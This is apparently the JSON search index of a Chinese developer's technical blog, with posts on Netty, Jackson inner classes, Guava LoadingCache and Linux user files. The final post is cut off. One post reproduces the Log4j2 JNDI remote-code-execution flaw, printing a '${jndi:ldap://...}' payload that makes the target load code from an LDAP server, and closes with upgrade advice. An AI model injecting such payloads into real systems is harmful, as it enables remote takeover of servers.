{"meta":{"title":"Virgil Chen 的技术博客","subtitle":"Stay hungry, stay foolish","description":"","author":"Virgil Chen","url":"https://virgilchen97.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2022-01-26T13:48:43.537Z","updated":"2022-01-26T13:48:43.537Z","comments":false,"path":"/404.html","permalink":"https://virgilchen97.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2022-01-26T13:48:43.537Z","updated":"2022-01-26T13:48:43.537Z","comments":false,"path":"about/index.html","permalink":"https://virgilchen97.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"分类","date":"2022-01-26T13:48:43.537Z","updated":"2022-01-26T13:48:43.537Z","comments":false,"path":"categories/index.html","permalink":"https://virgilchen97.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-01-26T13:48:43.557Z","updated":"2022-01-26T13:48:43.557Z","comments":true,"path":"links/index.html","permalink":"https://virgilchen97.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-01-26T13:48:43.557Z","updated":"2022-01-26T13:48:43.557Z","comments":false,"path":"repository/index.html","permalink":"https://virgilchen97.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-01-26T13:48:43.557Z","updated":"2022-01-26T13:48:43.557Z","comments":false,"path":"tags/index.html","permalink":"https://virgilchen97.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Netty 基本组件","slug":"2022-01-26-13-48-27-Netty-基本组件","date":"2022-01-26T05:48:27.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2022/01/2022-01-26-13-48-27-Netty-基本组件/","link":"","permalink":"https://virgilchen97.github.io/2022/01/2022-01-26-13-48-27-Netty-%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6/","excerpt":"上篇笔记中，我们试着用Netty实现了一个简单的server和client，但是感觉却是盲人摸象，对其中用到的各种组件之间的关系一头雾水，现在我们就来大致了解一下 netty 中的各种组件和他们之间的关系","text":"上篇笔记中，我们试着用Netty实现了一个简单的server和client，但是感觉却是盲人摸象，对其中用到的各种组件之间的关系一头雾水，现在我们就来大致了解一下 netty 中的各种组件和他们之间的关系 基本组件 Channel Java 网络编程中，Socket 是最最基本的组件，服务端需要通过 bind() 来绑定服务接口，通过 read() 和 write 来读取数据。Channel 则是 Netty 对于 Socket 的封装。简化了很多操作。 Channel 本身是一个接口，在 Netty 中有多种他的实现。 ChannelFuture Netty 中的网络操作都是异步的，和 Channel 相关的操作也一样，ChannelFuture 就是一个结果的占位符，你可以通过 addListener() 方法来在添加一个监听器，处理操作完成后的结果。 EventLoop EventLoop 是netty对于事件处理的抽象。在上一篇笔记中，创建服务器时，我们做的第一件事就是创建 EventLoopGroup： 1234public void start() throws Exception &#123; final EchoServerHandler echoServerHandler = new EchoServerHandler(); EventLoopGroup group = new NioEventLoopGroup(); // 创建EventLoop... 和 EventLoop 相关的一些对象关系如下： EventLoopGroup 包含多个 EventLoop 。 每个 EventLoop 都会分配一个线程。 每个 Channel 都会在其生命周期内会被分配一个 EventLoop ，二者是多对一的关系 ChannelHandler 实现了 ChannelHandler 接口的类中，基本就包含了我们的”业务代码“。你可以使用 ChannelHandler 对该 Channel 产生的事件做出响应，例如反序列化啊，解密啊，回写信息啊等等。 ChannelHandler 有两个子类：ChannelInboundHandler 和 ChannelOutboundHandler ，顾名思义，一个是用于处理入站事件，即收到数据，而另外一个用于处理出站事件，即发送数据。 ChannelPipeline 一个 ChannelPipeline 中包含了了一串 ChannelHandler。当一个事件发生时，这个事件会”流“过 ChannelPipeline 中的每一个 ChannelHandler，每一个 Handler 都可以对消息进行处理，或者将事件发送给下一个 Handler。 在一个 Channel 被创建时，都会被分配一个 ChannelPipeline。在我们进行 Bootstrap 时： 12345678910ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(group) .channel(NioServerSocketChannel.class) .localAddress(new InetSocketAddress(port)) .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel ch) throws Exception &#123; ch.pipeline().addLast(echoServerHandler); &#125;; &#125;); 会新建一个 ChannelInitializer 对象，当这个对象的 initChannel 方法被调用时，会将一系列的 ChannelHandler 加入到 Pipeline 里面去。 ChannalPipeline 会自动区分 ChannelInboundHandler 和 ChannelOutBoundHandler，并用他们分别处理入站/出站的数据。这个模式有点像 Spring 中的 Filter，都是责任链模式，每一个Handler都可以处理数据，或者将当前数据pass给下一个Handler： 以上就是Netty中的一些基本组件和设计。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Netty","slug":"Netty","permalink":"https://virgilchen97.github.io/tags/Netty/"}]},{"title":"Netty Hello world","slug":"2022-01-07-08-54-19-Netty-Hello-world","date":"2022-01-07T00:54:19.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2022/01/2022-01-07-08-54-19-Netty-Hello-world/","link":"","permalink":"https://virgilchen97.github.io/2022/01/2022-01-07-08-54-19-Netty-Hello-world/","excerpt":"本文中，我们使用Netty实现一个简单的服务器和客户端： 服务端收到什么，就发送回什么 （EchoServer） 客户端发送简单的字符串","text":"本文中，我们使用Netty实现一个简单的服务器和客户端： 服务端收到什么，就发送回什么 （EchoServer） 客户端发送简单的字符串 Echo Server 首先，我们先编写服务器的 Handler，当收到连接请求，接收到字符串后，返回相同的字符串内容： 12345678910111213141516171819202122232425@ChannelHandler.Sharable // 代表这个Handler的一个实例时可以被多个Channel共享的public class EchoServerHandler extends ChannelInboundHandlerAdapter &#123; // 每次收到信息的时候就会调用 @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123; ByteBuf in = (ByteBuf) msg; System.out.println(&quot;Server received: &quot; + in.toString(CharsetUtil.UTF_8)); // 输出收到的内容 ctx.write(in); // 将收到的内容写回去 &#125; // 当信息接收完时会调用 @Override public void channelReadComplete(ChannelHandlerContext ctx) throws Exception &#123; // 刷出所有的数据，完成后关闭 Channel ctx.writeAndFlush(Unpooled.EMPTY_BUFFER).addListener(ChannelFutureListener.CLOSE); &#125; // 异常处理 @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123; cause.printStackTrace(); ctx.close(); &#125;&#125; 这个 Handler 是处理收到的信息的，因此我们需要实现 ChannelInboundHandler 接口，定义连接建立，收到消息等等的行为。ChannelInboundHandlerAdapter 是 Netty 提供的对于 ChannelInboundHandler 接口最基本的实现。默认他会把所有事件都传递给 ChannelPipeline 中的下一个 Handler。在这里我们继承它，覆盖掉收到信息的几个行为，实现 Echo 定义好 Handler，我们需要编写启动服务器的代码： 123456789101112131415161718192021222324252627282930313233public class EchoServer &#123; private final int port; // 端口 public EchoServer(int port) &#123; this.port = port; &#125; public static void main(String[] args) throws Exception &#123; int port = 60000; new EchoServer(port).start(); &#125; public void start() throws Exception &#123; final EchoServerHandler echoServerHandler = new EchoServerHandler(); EventLoopGroup group = new NioEventLoopGroup(); // 创建EventLoop try &#123; ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(group) .channel(NioServerSocketChannel.class) .localAddress(new InetSocketAddress(port)) .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel ch) throws Exception &#123; ch.pipeline().addLast(echoServerHandler); &#125;; &#125;); ChannelFuture future = bootstrap.bind().sync(); // bind 绑定 Socket （同步） future.channel().closeFuture().sync(); // 关闭Channel （同步） &#125; finally &#123; group.shutdownGracefully().sync(); // 关闭服务器，释放所有资源 &#125; &#125;&#125; 其中较为核心的部分是在操作 ServerBootstrap 对象： .group() 绑定 EventLoopGroup .channel() 指定使用的是 NIO Channel .localAddress() 指定监听地址和端口 .childHandler() 有客户端建立连接（Channel）后，为每一个建立的 Channel 指定 Handler。ChannelInitializer 是Netty提供的一种 ChannelInboundHandlerAdapter 的实现，来在Channel初始化时进行一些操作，这里我们在每个 Channel 建立后，添加上了我们自己的 Handler。 至此，我们的 Echo 服务端就编写完毕 客户端 同样的，我们先编写 Handler 12345678910111213141516171819202122@ChannelHandler.Sharablepublic class EchoClientHandler extends SimpleChannelInboundHandler&lt;ByteBuf&gt; &#123; // Channel 建立后，立刻发送 &quot;Netty rocks!&quot; @Override public void channelActive(ChannelHandlerContext ctx) throws Exception &#123; ctx.writeAndFlush(Unpooled.copiedBuffer(&quot;Netty rocks!&quot;, CharsetUtil.UTF_8)); &#125; // 收到信息后打印出来 @Override protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception &#123; System.out.println(&quot;Client received: &quot; + msg.toString(CharsetUtil.UTF_8)); &#125; // 异常处理 @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123; cause.printStackTrace(); ctx.close(); &#125;&#125; 客户端我们继承的是 SimpleChannelInboundHandler，这也是Netty提供的一种 ChannelInboundHandlerAdapter 的实现，他简化到只会处理某种特定类型的消息，在我们的例子里是 ByteBuf 类型，而且在读取后，会立刻释放该信息。在我们的Server中，由于需要把信息返回个客户端，因此是不能在读取后立刻释放的。 接下来是客户端的启动代码： 123456789101112131415161718192021222324252627282930313233public class EchoClient &#123; private final String host; private final int port; public EchoClient(String host, int port) &#123; this.host = host; this.port = port; &#125; public static void main(String[] args) throws Exception&#123; new EchoClient(&quot;127.0.0.1&quot;, 60000).start(); &#125; public void start() throws Exception &#123; EventLoopGroup group = new NioEventLoopGroup(); try &#123; Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .remoteAddress(new InetSocketAddress(host, port)) .handler(new ChannelInitializer&lt;SocketChannel&gt;() &#123; @Override protected void initChannel(SocketChannel ch) throws Exception &#123; ch.pipeline().addLast(new EchoClientHandler()); &#125; &#125;); ChannelFuture f = bootstrap.connect().sync(); f.channel().closeFuture().sync(); &#125; finally &#123; group.shutdownGracefully().sync(); &#125; &#125;&#125; 运行 在idea中，我们首先启动Server 然后启动 Client Client 发送了 “Netty rocks!” 后，接收到了服务器返回的相同字符串，退出了。此时看服务器 提示收到了&quot;Netty rocks!&quot;。如果我们多次启动客户端，服务端也会多次收到一样的字符串： 这样，一个非常简单的 Netty 服务器和客户端就完成了","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Netty","slug":"Netty","permalink":"https://virgilchen97.github.io/tags/Netty/"}]},{"title":"Netty 简介","slug":"2022-01-06-14-41-45-Netty-简介","date":"2022-01-06T06:41:45.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2022/01/2022-01-06-14-41-45-Netty-简介/","link":"","permalink":"https://virgilchen97.github.io/2022/01/2022-01-06-14-41-45-Netty-%E7%AE%80%E4%BB%8B/","excerpt":"Netty is a NIO client server framework which enables quick and easy development of network applications such as protocol servers and clients. Netty 使用了 Java NIO API 来实现异步的，事件驱动的高性能网络编程框架，本文我们一起学习 Netty 的基本概念。","text":"Netty is a NIO client server framework which enables quick and easy development of network applications such as protocol servers and clients. Netty 使用了 Java NIO API 来实现异步的，事件驱动的高性能网络编程框架，本文我们一起学习 Netty 的基本概念。 Java 网络编程 很早以前的 Java 只支持阻塞式的网络编程，通常为了编写一个网络服务，你需要 使用 accept() 来等待客户端发来连接请求，收不到请求便一直阻塞 使用 BufferedReader 和 PrintWriter 来操作 accept() 返回的socket。BufferedReader 等待读取客户端发来的数据时，也是一直阻塞的。 这样做，服务器一次只能处理一个请求。想要响应多个请求，那么对于每一个 socket，我们可以在 accept() 以后开一个新的线程去处理，但是这么做有很多的缺点 大部分线程都因为等待输入被阻塞 连接数多时，会创建很多的线程，创建线程有开销 线程太多，CPU 频繁 context-switch 影响性能 我们需要一种更高性能的处理网络IO的方法 Java NIO (Non-blocking I/O) 为了解决上述问题，Java 为我们提供了 NIO 的 API。可以让我们注册多个socket，在某个socket有数据需要读取或写入时，由系统来通知我们。 Selectors selector 是 NIO 实现的关键，它使用操作系统的 API 来告诉我们那些Socket现在需要被读写，所以我们不再需要多个线程阻塞式的等待数据。一个线程就可以处理多个socket。但是 Java NIO 的 API 十分复杂，因此我们需要一个成熟的框架来让我们能够更轻松的使用 NIO，这就是 Netty。 Netty 核心组件 Netty 包含如下核心组件： Channels Callbacks Futures Events and handler Channels an open connection to an entity such as a hardware device, a file, a network socket, or a program component that is capable of performing one or more distinct I/O operations, for example reading or writing. 基本代表了一条连接，会发送/接收数据，可以开启或关闭 Callbacks 回调（Callback）是在一个事件发生的时候，针对该事件执行的函数，可以理解该事件就是函数的入参。在Netty中，通过实现 ChannelHandler 接口，可以实现自定义的回调函数。书上的例子： 123456public class ConnectHandler extends ChannelInboundHandlerAdapter &#123; @Override public void channelActive(ChannelHandlerContext ctx) throws Exception &#123; System.out.println(&quot;Client &quot; + ctx.channel().remoteAddress() + &quot; connected&quot;); &#125;&#125; 在有新连接建立时，channelActive 会被调用，打印出一些信息 Futures Future 和 Callback 较为类似，互相补充。Future 提供了一种告知某个操作是否完成的方法。执行一个异步方法时，方法会立刻返回一个 Future 作为方法结果的占位符，调用者可以通过 Future 对象来判断异步操作是否完成，并在操作完成后通过 Future 获取结果。 但是通过不断地轮询 Future 是否 ready 也是很麻烦的。因此 Netty 中的 ChannelFuture 允许我们注册一个或多个 ChannelFutureListener 当 Future 的操作完成时，Listener 便会使用其中定义的方法对 Future 的结果进行处理。 Events and Handlers Netty 通过产生各种事件来告诉我们某个操作的状态变化，而我们针对性的使用Handler来对相应变化。 Netty 讲事件分为入站事件和出站事件，入站事件可能是 新的连接/收到数据/发生错误，出站事件可能是 发起连接/写数据等等。这些事件都可以被用户定义的 Handler 捕获到，并作出响应。 Netty 本身也提供了很多现成的 Handler 给我们使用，例如 HTTP，SSL 的 Handler 等 总览 Netty 中，Futures，Callbacks 和 Handlers 为我们提供了对任何网络事件进行异步处理的能力，我们不需要关心事件何时发生，如何发生，只需要为事件定义好 Handler 或 callback，或者对产生的Future进行处理，而不需要关心网络操作过程中的任何细节。 而 Netty 中的 Event 和 Event Loop 则把 Java 中的 Selector 包装了起来。每一个 Channel 都会 被分配一个 EventLoop，EventLoop 则会注册各种事件，将需要的事件发送给指定的Handler，进行后续处理等等。 Netty 对于 NIO 的抽象让我们不再需要担心线程同步，事件分发等问题，我们只需要定义我们关心那些数据，对这些数据需要做什么处理，将处理好的数据发送到那里去就好了。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Netty","slug":"Netty","permalink":"https://virgilchen97.github.io/tags/Netty/"}]},{"title":"Jackson和内部类","slug":"2022-01-04-08-40-07-Jackson和内部类","date":"2022-01-04T00:40:07.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2022/01/2022-01-04-08-40-07-Jackson和内部类/","link":"","permalink":"https://virgilchen97.github.io/2022/01/2022-01-04-08-40-07-Jackson%E5%92%8C%E5%86%85%E9%83%A8%E7%B1%BB/","excerpt":"同事在写一个很简单的，从配置中心读取一个JSON，然后转换为服务内部的一个实体类的方法。这样的代码，想必大家已近烂熟于心了。但是那天，我同事写的这段代码却死也跑不起来，原因在于使用 jackson 反序列化 JSON 的过程中，无论如何返回的都是一个空对象。我和同事老哥看了半天，仔仔细细对了字段名是不是正确，从配置中心拉下来的配置是不是下划线命名了，有没有奇怪的注解等等，看了半天依旧没有看出问题。","text":"同事在写一个很简单的，从配置中心读取一个JSON，然后转换为服务内部的一个实体类的方法。这样的代码，想必大家已近烂熟于心了。但是那天，我同事写的这段代码却死也跑不起来，原因在于使用 jackson 反序列化 JSON 的过程中，无论如何返回的都是一个空对象。我和同事老哥看了半天，仔仔细细对了字段名是不是正确，从配置中心拉下来的配置是不是下划线命名了，有没有奇怪的注解等等，看了半天依旧没有看出问题。 排查 同事写的那段获取配置，并进行一些处理的代码，大概长这样： 1234567891011public class JacksonInnerClass &#123; public void someMethod(String[] args) &#123; Person person = ConfigUtils.getJsonProperty(&quot;server.person_config&quot;, Person.class); // 返回null // do something with person &#125; class Person &#123; int height; int weight; String name; &#125;&#125; ConfigUtils 是一个工具类，会从服务器获取 server.person_config 这个配置并且用 jackson 反序列化为对象。看起来毫无问题，但是无论如何 person 永远是null。 我平时写代码的时候不喜欢写内部类，遇到这种配置的映射类，我都会单独写在 dto 或者 vo 包里，联想到内部类可能有一些隐藏的属性，我吧Person这个类单独提取了出来，再debug，结果一遍通过，反序列化成功。 原因 一番搜索后，通过 这篇文章 了解到。Java 的非静态内部类，是可以访问外部类的私有成员变量的。为了实现这一点，Java在编译时，会给内部类添加一个传入外部类的构造方法。这就会导致内部类没有无参构造方法，导致 jackson 无法实例化对象。jackson 内部会报错： 1non-static inner classes like this can only by instantiated using default, no-argument constructor 我这里写了一个测试类： 1234567891011121314151617181920212223public class Test &#123; public void someMethod() &#123; String json = &quot;&#123;\\n&quot; + &quot; \\&quot;weight\\&quot;: 40,\\n&quot; + &quot; \\&quot;height\\&quot;: 160,\\n&quot; + &quot; \\&quot;name\\&quot;: \\&quot;frank\\&quot;\\n&quot; + &quot;&#125;&quot;; Person person = JsonUtils.fromJson(json, Person.class); System.out.println(person.getHeight()); &#125; @Data class Person &#123; int height; int weight; String name ; &#125; public static void main(String[] args) &#123; Test test = new Test(); test.someMethod(); &#125;&#125; 编译过后，这个类会生成两个 .class 文件 反编译 Test$Person 得到如下结果 123456789101112class Test$Person &#123; int height; int weight; String name; // $FF: synthetic field final Test this$0; // 多出的构造方法 public Test$Person(Test this$0) &#123; this.this$0 = this$0; &#125;... 可以看到，生成的类多出了一个入参是外部类的构造方法。注意这里，即使你自己在类中写一个无参的构造方法也是无效的，因为只要需要访问外部类，内部类中就必然要保存外部类的引用，你的无参构造方法会直接被无视掉。 解决 给内部类添加 static 修饰符，因为静态内部类不能访问外部类的成员变量。或者干脆不使用内部类。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"涨知识了","slug":"涨知识了","permalink":"https://virgilchen97.github.io/tags/%E6%B6%A8%E7%9F%A5%E8%AF%86%E4%BA%86/"}]},{"title":"Log4j2 RCE 0day漏洞学习","slug":"2021-12-16-14-24-08-Log4j2-RCE-0day漏洞学习","date":"2021-12-16T06:24:08.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2021/12/2021-12-16-14-24-08-Log4j2-RCE-0day漏洞学习/","link":"","permalink":"https://virgilchen97.github.io/2021/12/2021-12-16-14-24-08-Log4j2-RCE-0day%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"一些前置知识 1. Log4j2 是什么 在 SpringBoot 中，我们使用lombok经常会使用 @Slf4j 来注入一个log对象，调用info，debug等方法来记录日志。slf4j 是一个日志框架，是对所有日志制定的一种规范、标准、接口，但是并没有实现任何功能。 而 Log4j2 则是 slf4j 这个框架的一种具体实现，他支持通过不同的 Appender 将日志记录到控制台，文件，甚至kafka。 2. RCE 漏洞 远程命令/代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 本次漏洞 Log4j2 在记录日志时，支持动态属性，可以将动态的替换日志中的字段为环境变量，系统属性等。官方的 Lookup文档 具体的描述了支持替换属性。 攻击者可以通过调用接口或者是使用服务，被攻击的服务使用log4j记录包含 $&#123;&#125; 关键标识符的日志。触发log4j2的lookup逻辑。而 jndi 也是支持替换的属性之一。攻击者可以通过触发 JNDI ，通过ldap/rmi注入漏洞。成功利用此漏洞可以在目标服务器上执行任意代码。 复现 首先编写个类打印日志： 123456789import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Log4j &#123; private static Logger logger = LogManager.getLogger(Log4j.class); public static void main(String[] args) &#123; logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:23456/Command8&#125;&quot;); &#125;&#125; 然后使用su18大佬的这个 工具 ，启动一个 jndi 服务，把命令设置为打开记事本（notepad.exe） 运行代码，果然打开了记事本 我们这里只是打开了记事本，但是攻击者可以利用这个漏洞，将自己的ssh key加入服务器的authorized_keys，删除/写入/读取服务器上的文件，危险性极高。 修复 尽快将log4j升级为2.15.0-rc2之后的版本，官方在新版本中默认禁用了 JNDI lookup 功能。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://virgilchen97.github.io/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"LoadingCache 本地缓存","slug":"2021-08-19-06-56-27-LoadingCache-本地缓存","date":"2021-08-18T22:56:27.000Z","updated":"2022-01-26T13:48:51.153Z","comments":true,"path":"2021/08/2021-08-19-06-56-27-LoadingCache-本地缓存/","link":"","permalink":"https://virgilchen97.github.io/2021/08/2021-08-19-06-56-27-LoadingCache-%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98/","excerpt":"在项目开发中的时候，经常会遇到： 服务访问频率较高，但是依赖服务无法承受较高qps，或是依赖服务有较大时延 部分复杂配置仅需要偶尔获取即可，只在Bean加载时读取配置，想要让新的配置生效必须重启服务 其他对于数据时效性要求不高的情况 在我的开发过程中遇到的情况是，我开发的服务A要通过服务B获取配置来生成动态一些数据，服务B的配置随时可能被修改。如果生成数据每一条数据的时候都去调用一次服务B，对于服务B的压力过大，每次HTTP请求也会影响生成数据的性能。但是如果每次仅在Bean加载的时候获取服务器配置，会导致服务B上发生的配置修改在我这里无效。 这时，我们就想到了要使用缓存。说到缓存，大家第一个想到的就是大名鼎鼎的 Redis，但是对于某些小型服务，为了缓存就直接引入一个Redis服务器显然是不明智的。为了解决这个问题，Guava中为我们提供了一种本地缓存的解决方案——LoadingCache。","text":"在项目开发中的时候，经常会遇到： 服务访问频率较高，但是依赖服务无法承受较高qps，或是依赖服务有较大时延 部分复杂配置仅需要偶尔获取即可，只在Bean加载时读取配置，想要让新的配置生效必须重启服务 其他对于数据时效性要求不高的情况 在我的开发过程中遇到的情况是，我开发的服务A要通过服务B获取配置来生成动态一些数据，服务B的配置随时可能被修改。如果生成数据每一条数据的时候都去调用一次服务B，对于服务B的压力过大，每次HTTP请求也会影响生成数据的性能。但是如果每次仅在Bean加载的时候获取服务器配置，会导致服务B上发生的配置修改在我这里无效。 这时，我们就想到了要使用缓存。说到缓存，大家第一个想到的就是大名鼎鼎的 Redis，但是对于某些小型服务，为了缓存就直接引入一个Redis服务器显然是不明智的。为了解决这个问题，Guava中为我们提供了一种本地缓存的解决方案——LoadingCache。 LoadingCache 接口 先让我们来看下LoadingCahce接口的接口定义，让我们对这个工具有一个清楚的认知 12345678public interface LoadingCache&lt;K, V&gt; extends Cache&lt;K, V&gt;, Function&lt;K, V&gt; &#123; V get(K key) throws ExecutionException; V getUnchecked(K key); ImmutableMap&lt;K, V&gt; getAll(Iterable&lt;? extends K&gt; keys) throws ExecutionException; V apply(K key); void refresh(K key); ConcurrentMap&lt;K, V&gt; asMap();&#125; 其中比较重要的有 V get(K key) 通过 key 获取 value, 如果通过此key获取不到对应的value，则通过定义的 CacheLoader 的 load 方法原子的去载入这个 value V getUnchecked(K key) 与 get 基本相同，区别在定义的 CacheLoader 是否会抛出异常，如果不会则使用本方法 void refresh(K key) 重新使用 CacheLoader 去载入这个key对应的value 使用 Loading Cache使用了工厂模式来创建实例，通过 CacheBuilder 类，我们可以快速的创建自己需要的缓存。常用的有如下选项 maximumSize(long) 设置缓存容量的最大值，超过后，最不常用的缓存项将被清除 expireAfterAccess(long, TimeUnit) 在给定时间内没有被读/写访问，则回收。 expireAfterWrite(long, TimeUnit) 缓存项在给定时间内没有被写访问（创建或覆盖），则回收。 在调用 build() 方法时，需要传入一个实现了 CacheLoader 接口的实例，用来定义当指定的key获取不到缓存时，如何将数据载入缓存。通常我们可以直接new接口实现一个匿名内部类。 在我的使用场景下，我希望cache中的数据在载入60秒后过期，此时重新从B服务获取配置。我就会用如下代码来新建一个 LoadingCache 12345678private LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder() .expireAfterWrite(60, TimeUnit.SECONDS) .build(new CacheLoader&lt;String, Map&gt;() &#123; @Override public String load(String key)&#123; return serviceBravo.queryConfig(key) &#125; &#125;); 这样，每次使用key去B服务获取配置时，cache会先检查本地是否加载，若没有加载的话就会使用我们定义的 CacheLoader 去B服务加载配置并返回。下一次调用若在60秒内，则会直接返回缓存的结果。若B服务的配置发生了修改，60秒过后缓存失效，便会重新获取新的配置。这样大大降低了B服务的压力，提升了本服务的性能。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"实用工具类","slug":"实用工具类","permalink":"https://virgilchen97.github.io/tags/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB/"}]},{"title":"Linux文件权限","slug":"Linux文件权限","date":"2020-11-08T05:31:58.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/11/Linux文件权限/","link":"","permalink":"https://virgilchen97.github.io/2020/11/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/","excerpt":"","text":"Linux 安全性 Linux安全系统的核心是用户账户，用户权限是通过创建用户时分配的用户ID（UID）来跟踪的。 /etc/passwd 文件 Linux系统使用一个专门的文件来将用户的登录名匹配到对应的UID值。这个文件就是 /etc/passwd 文件，下面是一个这个文件的例子： 12345678910111213141516$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin[...] 其中，root 用户是系统的管理员，UID固定为0。同时Linux也会为各种各样的功能创建不同的账户，这些账户是系统账户，被各种服务进程用来访问资源，所有运行在后台的服务都需要用一个系统用户账户登录到Linux系统上。如果不考虑安全，这些服务都可以使用root账户登录。但是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。Linux 为系统账户预留了500以下的UID。 在 passwd 文件中有如下的字段，用冒号分隔： 用户名 密码 UID GID（组ID） 备注 Home目录位置 默认shell 值得注意的是所有用户的密码字段都是一个 x，因为密码并不直接保存在 passwd 文件中，而是保存在 /etc/shadow 文件中。 /etc/shadow 文件 /etc/shadow 文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问/etc/shadow文件，/etc/shadow文件为系统上的每个用户账户都保存了一条记录。如果使用普通用户查看此文件： 12$ cat /etc/shadowcat: /etc/shadow: Permission denied 使用root用户就可以看到文件内容，下面是一个例子： 1virgil:$6$mI1pRsd/$8.4RVzKnC3O3BU2FcXmtcLC7UQa.4z6q2tYXk/u7WlFAmmHIQDmVqI7HCeiDUBL6F0ynpSIY1Z0.:18236:0:99999:7::: 一共有9个字段，同样也是用冒号分隔： /etc/passwd文件中的登录名字段对应的登录名 加密后的密码 自上次修改密码后过去的天数 多少天后才能更改密码 多少天后必须更改密码 密码过期前提前多少天提醒用户更改密码 密码过期后多少天禁用用户账户 用户账户被禁用的日期 预留字段给将来使用 添加用户 可以使用 useradd 命令添加一个新用户，通过 -D 参数，我们可以看到其默认值： 12345678$ useradd -DGROUP=100 (默认添加到GID 100的公共组)HOME=/home (home目录位于/home/loginname)INACTIVE=-1 (密码过期不会被禁用)EXPIRE=SHELL=/bin/sh SKEL=/etc/skel (将内容复制到HOME目录下)CREATE_MAIL_SPOOL=no 默认情况下，Ubuntu中的 /etc/skel 中有如下文件 1234567$ ls -al /etc/skel/total 20drwxr-xr-x 2 root root 4096 Dec 6 2019 .drwxr-xr-x 106 root root 4096 Nov 8 13:17 ..-rw-r--r-- 1 root root 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 root root 3771 Apr 4 2018 .bashrc-rw-r--r-- 1 root root 807 Apr 4 2018 .profile 如果我们现在创建一个新的用户 test, 默认情况下 useradd 不会创建用户的home目录，我们可以指定 -m 参数来创建： 1234567891011$ sudo useradd -m test$ ls /hometest virgil$ ls /home/test/$ ls -al /home/test/total 20drwxr-xr-x 2 test test 4096 Nov 8 15:10 .drwxr-xr-x 4 root root 4096 Nov 8 15:10 ..-rw-r--r-- 1 test test 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 test test 3771 Apr 4 2018 .bashrc-rw-r--r-- 1 test test 807 Apr 4 2018 .profile 可以看到用户被创建，该用户的HOME目录中也有了一份 /etc/skel 中文件的拷贝。注意创建用户需要使用管理员账户。 删除用户 userdel 可以用来删除用户，默认情况下只会删除 passwd 中的用户信息，如果加上 -r 参数，则会删除HOME目录以及邮件目录： 123$ 